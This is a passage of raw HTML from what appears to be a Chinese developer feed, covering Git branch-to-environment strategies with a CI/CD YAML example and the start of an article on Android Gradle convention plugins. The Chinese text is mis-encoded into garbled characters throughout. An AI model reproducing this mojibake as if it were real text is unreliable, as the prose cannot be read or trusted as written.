develop        <span class="hljs-comment">-- ç ”å‘ç¯å¢ƒï¼ˆé›†æˆå¼€å‘åˆ†æ”¯ï¼‰</span>
â”œâ”€â”€ feature/*  <span class="hljs-comment">-- åŠŸèƒ½å¼€å‘åˆ†æ”¯</span>
</code></pre>
<h3 data-id="heading-1">å…·ä½“å¯¹åº”å…³ç³»ï¼š</h3>



































<table><thead><tr><th>ç¯å¢ƒ</th><th>åˆ†æ”¯</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>ç”Ÿäº§ç¯å¢ƒ</strong></td><td><code>master</code> / <code>main</code></td><td>ç”Ÿäº§ç¯å¢ƒçš„ä»£ç ï¼Œå¿…é¡»æ˜¯ç¨³å®šå¯å‘å¸ƒçš„</td></tr><tr><td><strong>æµ‹è¯•ç¯å¢ƒ</strong></td><td><code>release/*</code> (å¦‚ <code>release/v1.2.0</code>)</td><td>ä¸“é—¨ç”¨äºæµ‹è¯•çš„åˆ†æ”¯ï¼Œä» <code>develop</code> æ‹‰å‡º</td></tr><tr><td><strong>ç ”å‘ç¯å¢ƒ</strong></td><td><code>develop</code></td><td>æ—¥å¸¸å¼€å‘é›†æˆç¯å¢ƒ</td></tr><tr><td><strong>åŠŸèƒ½å¼€å‘</strong></td><td><code>feature/*</code> (å¦‚ <code>feature/user-auth</code>)</td><td>ä» <code>develop</code> æ‹‰å‡ºï¼Œå¼€å‘å®Œæˆååˆå¹¶å› <code>develop</code></td></tr><tr><td><strong>ç´§æ€¥ä¿®å¤</strong></td><td><code>hotfix/*</code> (å¦‚ <code>hotfix/login-bug</code>)</td><td>ä» <code>master</code> æ‹‰å‡ºï¼Œä¿®å¤ååˆå¹¶å› <code>master</code> å’Œ <code>develop</code></td></tr></tbody></table>
<p><strong>å·¥ä½œæµç¨‹</strong>ï¼š</p>
<ol>
<li>æ–°åŠŸèƒ½ï¼š<code>feature/*</code> â†’ <code>develop</code> (ç ”å‘ç¯å¢ƒ)</li>
<li>æµ‹è¯•ï¼š<code>develop</code> â†’ <code>release/*</code> (æµ‹è¯•ç¯å¢ƒ)</li>
<li>ä¸Šçº¿ï¼š<code>release/*</code> â†’ <code>master</code> (ç”Ÿäº§ç¯å¢ƒ)</li>
<li>ç´§æ€¥ä¿®å¤ï¼š<code>hotfix/*</code> â†’ <code>master</code> (ç”Ÿäº§ç¯å¢ƒ) + <code>develop</code> (ç ”å‘ç¯å¢ƒ)</li>
</ol>
<hr/>
<h2 data-id="heading-2">äºŒã€åŸºäº GitHub/GitLab Flow çš„ç®€åŒ–æ¨¡å‹ï¼ˆç°ä»£æ¨èï¼‰</h2>
<pre><code class="hljs language-lua" lang="lua">main/master    <span class="hljs-comment">-- ç”Ÿäº§ç¯å¢ƒ</span>
â”œâ”€â”€ staging    <span class="hljs-comment">-- æµ‹è¯•ç¯å¢ƒåˆ†æ”¯ï¼ˆå¯é€‰ï¼‰</span>
â”œâ”€â”€ develop    <span class="hljs-comment">-- ç ”å‘ç¯å¢ƒåˆ†æ”¯ï¼ˆå¯é€‰ï¼‰</span>
â””â”€â”€ feature/*  <span class="hljs-comment">-- åŠŸèƒ½åˆ†æ”¯</span>
</code></pre>
<h3 data-id="heading-3">ç¯å¢ƒä¸åˆ†æ”¯å¯¹åº”ï¼š</h3>






























<table><thead><tr><th>ç¯å¢ƒ</th><th>åˆ†æ”¯</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>ç”Ÿäº§ç¯å¢ƒ</strong></td><td><code>main</code> / <code>master</code></td><td>ç›´æ¥å¯¹åº”ç”Ÿäº§ï¼Œæ¯æ¬¡åˆå¹¶éƒ½åº”è¯¥æ˜¯å¯å‘å¸ƒçš„</td></tr><tr><td><strong>æµ‹è¯•ç¯å¢ƒ</strong></td><td><code>staging</code> / <code>test</code></td><td>ä¸“é—¨ç”¨äºæµ‹è¯•çš„åˆ†æ”¯ï¼Œä» <code>main</code> æ‹‰å‡ºæˆ–å®šæœŸåŒæ­¥</td></tr><tr><td><strong>ç ”å‘ç¯å¢ƒ</strong></td><td><code>develop</code> (å¯é€‰)</td><td>é›†æˆç¯å¢ƒï¼ŒåŠŸèƒ½åˆ†æ”¯åˆå¹¶åˆ°æ­¤è¿›è¡Œåˆæ­¥éªŒè¯</td></tr><tr><td><strong>åŠŸèƒ½åˆ†æ”¯</strong></td><td><code>feature/xxx</code>, <code>fix/xxx</code></td><td>æ‰€æœ‰å¼€å‘éƒ½åœ¨ç‹¬ç«‹åˆ†æ”¯è¿›è¡Œ</td></tr></tbody></table>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>æ›´ç®€å•ç›´è§‚</li>
<li>åŠŸèƒ½åˆ†æ”¯é€šè¿‡ Pull Request ç›´æ¥åˆå¹¶åˆ° <code>main</code></li>
<li>å¯ä½¿ç”¨ç¯å¢ƒåˆ†æ”¯æˆ–é€šè¿‡ CI/CD è‡ªåŠ¨éƒ¨ç½²ä¸åŒç¯å¢ƒ</li>
</ul>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€å®é™…é¡¹ç›®ä¸­çš„å¸¸è§å®è·µ</h2>
<h3 data-id="heading-5">æ–¹æ¡ˆ Aï¼šä¸‰ç¯å¢ƒç‹¬ç«‹åˆ†æ”¯</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ†æ”¯ç»“æ„</span>
main/master     <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒ</span>
staging         <span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒï¼ˆé¢„å‘å¸ƒï¼‰</span>
develop         <span class="hljs-comment"># ç ”å‘ç¯å¢ƒï¼ˆæ—¥å¸¸é›†æˆï¼‰</span>
</code></pre>
<h3 data-id="heading-6">æ–¹æ¡ˆ Bï¼šåŸºäºæ ‡ç­¾/æäº¤çš„éƒ¨ç½²</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ†æ”¯ç»“æ„</span>
main/master     <span class="hljs-comment"># ä¸»çº¿åˆ†æ”¯</span>
feature/*       <span class="hljs-comment"># åŠŸèƒ½åˆ†æ”¯</span>

<span class="hljs-comment"># é€šè¿‡Gitæ ‡ç­¾åŒºåˆ†ç¯å¢ƒ</span>
git tag -a v1.0.0-prod -m <span class="hljs-string">"ç”Ÿäº§ç¯å¢ƒå‘å¸ƒ"</span>
git tag -a v1.0.0-staging -m <span class="hljs-string">"æµ‹è¯•ç¯å¢ƒ"</span>
</code></pre>
<h3 data-id="heading-7">æ–¹æ¡ˆ Cï¼šç¯å¢ƒç‰¹å®šåˆ†æ”¯å‰ç¼€</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ†æ”¯å‘½åçº¦å®š</span>
<span class="hljs-built_in">env</span>/production/xxx   <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒç›¸å…³é…ç½®</span>
<span class="hljs-built_in">env</span>/staging/xxx      <span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒç›¸å…³é…ç½®</span>
<span class="hljs-built_in">env</span>/development/xxx  <span class="hljs-comment"># ç ”å‘ç¯å¢ƒç›¸å…³é…ç½®</span>
</code></pre>
<hr/>
<h2 data-id="heading-8">å››ã€æ¨èçš„åˆ†æ”¯å‘½åè§„èŒƒ</h2>
<h3 data-id="heading-9">1. <strong>åŠŸèƒ½åˆ†æ”¯</strong>ï¼ˆç ”å‘é˜¶æ®µï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">feature/user-authentication    <span class="hljs-comment"># ç”¨æˆ·è®¤è¯åŠŸèƒ½</span>
feature/add-payment-method     <span class="hljs-comment"># æ·»åŠ æ”¯ä»˜æ–¹å¼</span>
feat/search-optimization       <span class="hljs-comment"># æœç´¢ä¼˜åŒ–</span>
</code></pre>
<h3 data-id="heading-10">2. <strong>ä¿®å¤åˆ†æ”¯</strong></h3>
<pre><code class="hljs language-bash" lang="bash">fix/login-page-crash           <span class="hljs-comment"># ç™»å½•é¡µé¢å´©æºƒä¿®å¤</span>
bugfix/memory-leak             <span class="hljs-comment"># å†…å­˜æ³„æ¼ä¿®å¤</span>
hotfix/critical-security       <span class="hljs-comment"># ç´§æ€¥å®‰å…¨ä¿®å¤</span>
</code></pre>
<h3 data-id="heading-11">3. <strong>å‘å¸ƒåˆ†æ”¯</strong>ï¼ˆæµ‹è¯•é˜¶æ®µï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">release/v1.2.0                 <span class="hljs-comment"># ç‰ˆæœ¬1.2.0å‘å¸ƒåˆ†æ”¯</span>
release/2024-03-update         <span class="hljs-comment"># 2024å¹´3æœˆæ›´æ–°</span>
</code></pre>
<h3 data-id="heading-12">4. <strong>ç¯å¢ƒé…ç½®åˆ†æ”¯</strong></h3>
<pre><code class="hljs language-bash" lang="bash">config/production              <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒé…ç½®</span>
config/staging                 <span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒé…ç½®</span>
config/development             <span class="hljs-comment"># ç ”å‘ç¯å¢ƒé…ç½®</span>
</code></pre>
<hr/>
<h2 data-id="heading-13">äº”ã€æœ€ä½³å®è·µå»ºè®®</h2>
<h3 data-id="heading-14">1. <strong>å›¢é˜Ÿçº¦å®šä¼˜å…ˆ</strong></h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨é¡¹ç›®READMEæˆ–CONTRIBUTING.mdä¸­æ˜ç¡®çº¦å®š</span>
<span class="hljs-comment"># .gitåˆ†æ”¯ç­–ç•¥æ–‡æ¡£ç¤ºä¾‹ï¼š</span>
â”œâ”€â”€ main                      <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒï¼Œä¿æŠ¤åˆ†æ”¯</span>
â”œâ”€â”€ staging                   <span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒï¼Œè‡ªåŠ¨éƒ¨ç½²</span>
â”œâ”€â”€ develop                   <span class="hljs-comment"># ç ”å‘ç¯å¢ƒï¼ŒæŒç»­é›†æˆ</span>
â”œâ”€â”€ feature/[ticket-id]-[description]  <span class="hljs-comment"># åŠŸèƒ½åˆ†æ”¯</span>
â”œâ”€â”€ fix/[ticket-id]-[description]      <span class="hljs-comment"># ä¿®å¤åˆ†æ”¯</span>
â””â”€â”€ release/v[version]        <span class="hljs-comment"># å‘å¸ƒåˆ†æ”¯</span>
</code></pre>
<h3 data-id="heading-15">2. <strong>CI/CDé›†æˆç¤ºä¾‹</strong></h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .gitlab-ci.yml æˆ– GitHub Actions é…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">stages:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">build</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">test</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">deploy</span>

<span class="hljs-comment"># è‡ªåŠ¨éƒ¨ç½²åˆ°ä¸åŒç¯å¢ƒ</span>
<span class="hljs-attr">deploy_to_development:</span>
  <span class="hljs-attr">stage:</span> <span class="hljs-string">deploy</span>
  <span class="hljs-attr">script:</span> <span class="hljs-string">./deploy.sh</span> <span class="hljs-string">development</span>
  <span class="hljs-attr">only:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">develop</span>               <span class="hljs-comment"># åˆå¹¶åˆ°developæ—¶éƒ¨ç½²åˆ°ç ”å‘ç¯å¢ƒ</span>

<span class="hljs-attr">deploy_to_staging:</span>
  <span class="hljs-attr">stage:</span> <span class="hljs-string">deploy</span>
  <span class="hljs-attr">script:</span> <span class="hljs-string">./deploy.sh</span> <span class="hljs-string">staging</span>
  <span class="hljs-attr">only:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">staging</span>               <span class="hljs-comment"># åˆå¹¶åˆ°stagingæ—¶éƒ¨ç½²åˆ°æµ‹è¯•ç¯å¢ƒ</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">/^release/.*$/</span>        <span class="hljs-comment"># æˆ–å‘å¸ƒåˆ†æ”¯</span>

<span class="hljs-attr">deploy_to_production:</span>
  <span class="hljs-attr">stage:</span> <span class="hljs-string">deploy</span>
  <span class="hljs-attr">script:</span> <span class="hljs-string">./deploy.sh</span> <span class="hljs-string">production</span>
  <span class="hljs-attr">only:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">main</span>                  <span class="hljs-comment"># åˆå¹¶åˆ°mainæ—¶éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒ</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">tags</span>                  <span class="hljs-comment"># æˆ–æ‰“æ ‡ç­¾æ—¶éƒ¨ç½²</span>
</code></pre>
<h3 data-id="heading-16">3. <strong>åˆ†æ”¯ä¿æŠ¤è§„åˆ™</strong></h3>
<ul>
<li><strong>main/master</strong>: å¼ºåˆ¶ä»£ç å®¡æŸ¥ã€è¦æ±‚CIé€šè¿‡ã€ç¦æ­¢ç›´æ¥push</li>
<li><strong>staging</strong>: å¼ºåˆ¶ä»£ç å®¡æŸ¥ã€è¦æ±‚è‡ªåŠ¨åŒ–æµ‹è¯•é€šè¿‡</li>
<li><strong>develop</strong>: è¦æ±‚åŸºæœ¬æ£€æŸ¥é€šè¿‡</li>
</ul>
<hr/>
<h2 data-id="heading-17">å…­ã€æ€»ç»“æ¨èæ–¹æ¡ˆ</h2>
<p>å¯¹äºå¤§å¤šæ•°ä¸­å°å‹é¡¹ç›®ï¼Œæ¨èä»¥ä¸‹ç®€å•æœ‰æ•ˆçš„æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ ¸å¿ƒåˆ†æ”¯</span>
main/master     <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒï¼ˆä¿æŠ¤åˆ†æ”¯ï¼‰</span>
staging         <span class="hljs-comment"># æµ‹è¯•ç¯å¢ƒï¼ˆé¢„å‘å¸ƒï¼‰</span>
develop         <span class="hljs-comment"># ç ”å‘ç¯å¢ƒï¼ˆå¯é€‰ï¼Œå¦‚ä¸ç”¨åˆ™åŠŸèƒ½åˆ†æ”¯ç›´æ¥åˆ°stagingï¼‰</span>

<span class="hljs-comment"># ä¸´æ—¶åˆ†æ”¯</span>
feature/*       <span class="hljs-comment"># åŠŸèƒ½å¼€å‘</span>
fix/*           <span class="hljs-comment"># é—®é¢˜ä¿®å¤</span>
hotfix/*        <span class="hljs-comment"># ç”Ÿäº§ç´§æ€¥ä¿®å¤</span>
</code></pre>
<p><strong>ä½¿ç”¨æµç¨‹</strong>ï¼š</p>
<ol>
<li>ä» <code>main</code> åˆ›å»º <code>feature/xxx</code> åˆ†æ”¯å¼€å‘</li>
<li>å¼€å‘å®Œæˆåï¼Œåˆ›å»º PR åˆå¹¶åˆ° <code>staging</code>ï¼ˆæµ‹è¯•ç¯å¢ƒï¼‰</li>
<li>æµ‹è¯•é€šè¿‡åï¼Œåˆ›å»º PR åˆå¹¶åˆ° <code>main</code>ï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰</li>
<li>ç”Ÿäº§å‘ç°é—®é¢˜ï¼Œä» <code>main</code> åˆ›å»º <code>hotfix/xxx</code>ï¼Œä¿®å¤ååˆå¹¶å› <code>main</code> å’Œ <code>staging</code></li>
</ol>
<p>è¿™æ ·çš„ç»“æ„æ¸…æ™°ã€ç®€å•ï¼Œé€‚åˆ CI/CD è‡ªåŠ¨åŒ–æµç¨‹ã€‚æœ€é‡è¦çš„æ˜¯<strong>å›¢é˜Ÿç»Ÿä¸€çº¦å®š</strong>å¹¶ä¸¥æ ¼æ‰§è¡Œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Androidä¾èµ–çš„ç»Ÿä¸€ç®¡ç†]]></title>    <link>https://juejin.cn/post/7589958976226852874</link>    <guid>https://juejin.cn/post/7589958976226852874</guid>    <pubDate>2026-01-02T08:47:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589958976226852874" data-draft-id="7590128405350481920" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Androidä¾èµ–çš„ç»Ÿä¸€ç®¡ç†"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-02T08:47:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Poorguy9527"/> <meta itemprop="url" content="https://juejin.cn/user/1746465251931063"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Androidä¾èµ–çš„ç»Ÿä¸€ç®¡ç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1746465251931063/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Poorguy9527
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:47:36.000Z" title="Fri Jan 02 2026 08:47:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä»¥NowInAndroidä¸ºèŒƒæœ¬</p>
</blockquote>
<h2 data-id="heading-0">build-logicåˆ°åº•æ˜¯å¹²ä»€ä¹ˆç”¨çš„</h2>
<p>NowInAndroidé¡¹ç›®ä¸­çš„Â <strong><code>build-logic</code>Â æ˜¯ä¸€ä¸ªä¸“é—¨å­˜æ”¾â€œçº¦å®šæ’ä»¶â€çš„ç‹¬ç«‹æ¨¡å—</strong>ï¼Œå®ƒé€šè¿‡æ’ä»¶åŒ–çš„æ–¹å¼ï¼Œ<strong>é›†ä¸­ç®¡ç†å’Œå¤ç”¨æ‰€æœ‰æ¨¡å—ï¼ˆå¦‚Â <code>app</code>ã€<code>feature</code>ã€<code>core</code>ï¼‰çš„é€šç”¨Gradleæ„å»ºé…ç½®</strong>ã€‚</p>
<p>å®ƒçš„ä¸»è¦ç›®çš„æ˜¯å°†é¡¹ç›®ä¸­å¤§é‡é‡å¤ã€åˆ†æ•£çš„Gradleé…ç½®ä»£ç æŠ½å–å‡ºæ¥ï¼Œè¿›è¡Œæ ‡å‡†åŒ–å’Œç»Ÿä¸€ç®¡ç†ã€‚å…·ä½“æ¥çœ‹ï¼š</p>
<ol>
<li><strong>æ¶ˆé™¤é‡å¤é…ç½®</strong>ï¼šå„ä¸ªåŠŸèƒ½æ¨¡å—çš„Â <code>build.gradle.kts</code>Â æ–‡ä»¶å› æ­¤å˜å¾—éå¸¸ç®€æ´ï¼Œé€šå¸¸åªéœ€å£°æ˜åº”ç”¨å“ªäº›çº¦å®šæ’ä»¶å’Œæ¨¡å—ç‰¹å®šçš„ä¾èµ–ï¼Œå…¶ä»–é€šç”¨é…ç½®ï¼ˆå¦‚Androidæ’ä»¶ã€Composeã€Javaç‰ˆæœ¬ã€æµ‹è¯•è®¾ç½®ç­‰ï¼‰éƒ½å°è£…åœ¨æ’ä»¶ä¸­<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.csdn.net%2F663057e9c46af92642795f0e.html" target="_blank" title="https://gitcode.csdn.net/663057e9c46af92642795f0e.html" ref="nofollow noopener noreferrer"/><a href="https://juejin.cn/post/7339024907717804095" target="_blank" title="https://juejin.cn/post/7339024907717804095"/>ã€‚</li>
<li><strong>ä½œä¸ºâ€œå•ä¸€å¯ä¿¡æºâ€</strong> ï¼šå½“éœ€è¦ä¿®æ”¹é€šç”¨æ„å»ºé…ç½®ï¼ˆä¾‹å¦‚ï¼Œå‡çº§Kotlinç‰ˆæœ¬æˆ–è°ƒæ•´ç¼–è¯‘é€‰é¡¹ï¼‰æ—¶ï¼Œåªéœ€åœ¨Â <code>build-logic</code>Â ä¸­ä¿®æ”¹ä¸€æ¬¡ï¼Œå³å¯åº”ç”¨åˆ°æ‰€æœ‰ç›¸å…³æ¨¡å—ï¼Œç¡®ä¿é¡¹ç›®é…ç½®çš„ä¸€è‡´æ€§å¹¶æå¤§é™ä½ç»´æŠ¤æˆæœ¬</li>
</ol>
<p>é‚£çš„ç¡®å¾ˆæœ‰å¿…è¦ï¼Œ</p>
<p>çœ‹åˆ°ä¸€å †çš„ä¸šåŠ¡æ¨¡å—ï¼Œå¦‚æœæ¯ä¸ªæ¨¡å—éƒ½è¦å»é‡å¤é…ç½®å’Œæ·»åŠ ä¾èµ–ï¼Œä¸€æ—¦è¦ä¿®æ”¹ï¼Œåˆè¦å…¨éƒ¨ä¿®æ”¹ä¸€éï¼Œå®åœ¨æ˜¯æµªè´¹æ—¶é—´ã€‚</p>
<blockquote>
<p>ä¸appåŒçº§çš„ç‹¬ç«‹æ–‡ä»¶å¤¹</p>
</blockquote>
<p>å¹¶ä¸éš¶å±ä¸appï¼Œç‹¬ç«‹çš„</p>
<h2 data-id="heading-1">çº¦å®šä¼˜äºé…ç½®</h2>
<p>åœ¨å®é™…çš„å¼€å‘ä¸­ï¼Œæ·»åŠ ä¾èµ–æ—¶ä¼šæƒ³ï¼šæ¯å¢åŠ ä¸€ä¸ªä¸šåŠ¡æ¨¡å—ï¼Œå°±è¦é…ç½®ä¸€äº›ç›¸åŒçš„ä¾èµ–ï¼Œ</p>
<p>é‚£ä¹ˆï¼Œæœ‰æ²¡æœ‰åŠæ³•ï¼Œåªéœ€å¼•å…¥ä¸€å¥è¯å°±èƒ½æå®šçš„å‘¢ï¼Ÿ</p>
<p>æœ‰çš„ï¼Œå…„å¼Ÿï¼ŒåŒ…æœ‰çš„ã€‚</p>
<p>å°è£…gradleè‡ªå®šä¹‰ï¼ˆçº¦å®šï¼‰æ’ä»¶ï¼Œ</p>
<p>æ¯ä¸€ç§æ’ä»¶è´Ÿè´£ä¸€ä¸ªç‰¹å®šçš„é…ç½®é¢†åŸŸï¼Œï¼ˆAndroidåº“ï¼Œcomposeï¼Œæµ‹è¯•ç­‰ï¼‰</p>
<p>èŒè´£åˆ’åˆ†é²œæ˜ï¼Œç»„åˆä½¿ç”¨ï¼Œ</p>
<p>é¿å…åˆ›å»ºå…¨èƒ½çš„æ’ä»¶ï¼Œé…ç½®ç»„åˆä¸å¤Ÿç²¾ç»†ï¼Œå°¾å¤§ä¸æ‰ã€‚</p>
<p>å½“ç„¶ï¼Œ</p>
<p>å…±ç”¨çš„å¯ä»¥çº¦å®šï¼Œ</p>
<p>ç‰¹æœ‰çš„åˆ™æ˜¯æŒ‰ç…§è€åŠæ³•ä½¿ç”¨ä¾èµ–ï¼Œ</p>
<p>è¿™ä¸éš¾ç†è§£ï¼Œ</p>
<blockquote>
<p>ç‰ˆæœ¬ç›®å½•/gradle/libs.versions.toml</p>
</blockquote>
<p>é€šç”¨çš„ï¼Œ<code>å¯ä»¥ä¸æ–­æ”¶é›†æ‰©å¼ ä¾èµ–åº“</code></p>
<p>å³ä½¿æ˜¯æ–°é¡¹ç›®ä¹Ÿæ˜¯æ‹¿æ¥å°±ç”¨ï¼Œ</p>
<p>å®Œå…¨ä¸å¿…è¦ï¼Œè‡ªå·±é‡æ–°è®°å½•æ•´ç†ï¼Œå› ä¸ºè¿™åªæ˜¯ä¸€ä¸ªä¾èµ–ç›®å½•ï¼Œ</p>
<p>å…·ä½“çš„ä½¿ç”¨ï¼Œè¿˜æ˜¯è¦åœ¨åŠŸèƒ½æ¨¡å—çš„gradleä¸­é…ç½®ã€‚</p>
<p>éšç€è®°å½•ï¼Œç›®å½•ä¼šè¶Šæ¥è¶Šé•¿ã€‚</p>
<p>å¥½åœ¨ï¼Œä»åç§°å°±èƒ½æ¸…æ¥šçŸ¥é“ï¼Œæ˜¯ä»€ä¹ˆä¾èµ–åº“ï¼Œ</p>
